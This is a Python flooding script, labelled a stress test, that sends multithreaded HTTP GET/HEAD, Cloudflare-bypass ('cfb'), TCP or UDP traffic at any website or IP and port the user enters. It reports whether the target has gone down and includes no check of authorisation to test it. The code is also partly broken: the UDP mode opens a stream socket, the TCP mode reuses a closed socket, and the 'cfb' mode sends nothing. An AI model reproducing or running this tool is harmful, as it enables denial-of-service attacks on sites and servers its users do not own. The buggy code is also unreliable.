import cloudscraper
import httpx
import socket
import threading
import time
from colorama import Fore, Style, init

# Initialize colorama
init()

# Set the protocol/method to use for sending requests
print("Enter the protocol/method to use:")
print("Layer 7: get, head, cfb")
print("Layer 4: tcp, udp")
protocol = input()

if protocol in ["get", "head", "cfb"]:
    # Set the URL of the website to test
    url = input("Enter the website URL (including http or https): ")
elif protocol in ["tcp", "udp"]:
    # Set the IP address and port of the server to test
    ip = input("Enter the IP address of the server: ")
    port = int(input("Enter the port number: "))

# Set the number of threads to use
num_threads = int(input("Enter the number of threads to use: "))

# Set the duration of the stress test in seconds
duration = int(input("Enter the duration of the stress test in seconds: "))

# Set the packet size (in bytes)
if protocol == "udp":
    packet_size = 65507 # Maximum size for a UDP packet
elif protocol == "tcp":
    packet_size = 65535 # Maximum size for a TCP packet

# Initialize packet counter and lock
packet_counter = 0
packet_counter_lock = threading.Lock()

def stress_test(thread_id):
    global packet_counter

    if protocol == "cfb":
        client = cloudscraper.create_scraper()
    elif protocol in ["get", "head"]:
        client = httpx.Client()
    elif protocol in ["tcp", "udp"]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    else:
        print(Fore.RED + f"Invalid protocol: {protocol}" + Style.RESET_ALL)
        return

    start_time = time.time()
    last_print_time = start_time
    if thread_id == 0:
        if protocol in ["get", "head", "cfb"]:
            print(Fore.YELLOW + f"Stress testing started on {url} successfully!" + Style.RESET_ALL)
        elif protocol in ["tcp", "udp"]:
            print(Fore.YELLOW + f"Stress testing started on {ip}:{port} successfully!" + Style.RESET_ALL)
    while time.time() - start_time < duration:
        if protocol in ["get", "head", "cfb"]:
            send_request(client)
            with packet_counter_lock:
                packet_counter += 1
        elif protocol in ["tcp", "udp"]:
            send_packet(sock)
            with packet_counter_lock:
                packet_counter += 1
        if thread_id == 0 and time.time() - last_print_time >= 10:
            with packet_counter_lock:
                if protocol in ["get", "head", "cfb"]:
                    try:
                        response_start_time = time.time()
                        response = httpx.get(url)
                        response_end_time = time.time()
                        response_time = round((response_end_time - response_start_time) * 1000, 2)
                        print(Fore.GREEN + f"Website is up. Response time: {response_time} ms. Sent {packet_counter} requests to {url}" + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"Website is down. Sent {packet_counter} requests to {url}" + Style.RESET_ALL)
                elif protocol in ["tcp", "udp"]:
                    print(f"Sent {packet_counter} packets to {ip}:{port}")
                last_print_time = time.time()
    if thread_id == 0:
        print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)

def send_request(client):
    try:
        if protocol == "get":
            response = client.get(url)
        elif protocol == "head":
            response = client.head(url)
    except Exception as e:
        pass # Suppress error messages

def send_packet(sock):
    try:
        if protocol == "tcp":
            sock.connect((ip, port))
            sock.send(b"X" * packet_size) # Send a packet with maximum size
            sock.close()
        elif protocol == "udp":
            sock.sendto(b"X" * packet_size, (ip, port)) # Send a packet with maximum size
    except Exception as e:
        pass # Suppress error messages

# Create and start the threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=stress_test, args=(i,))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()
